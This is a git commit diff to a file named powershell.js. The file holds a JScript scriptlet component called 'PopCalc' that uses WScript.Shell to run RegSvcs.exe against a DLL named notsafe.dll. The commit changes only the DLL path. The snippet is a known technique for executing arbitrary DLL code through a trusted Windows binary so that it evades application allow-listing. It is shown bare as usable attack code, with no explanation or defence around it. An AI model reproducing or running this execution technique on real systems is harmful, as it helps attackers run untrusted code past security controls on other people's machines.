0975a2d780142151a40baf88bac762a3072044d0
ment4t <ment4t@users.noreply.github.com>
2020-10-07 16:52:43 +0100

    Update powershell.js

--- powershell.js
+++ powershell.js
@@ -3,7 +3,7 @@
 <component id="PopCalc">
 <script language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe C:\Users\durysg\notsafe.dll"); 
+var r = new ActiveXObject("WScript.Shell").Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe c:\users\notsafe.dll"); 
 ]]>
 </script>
 </component>
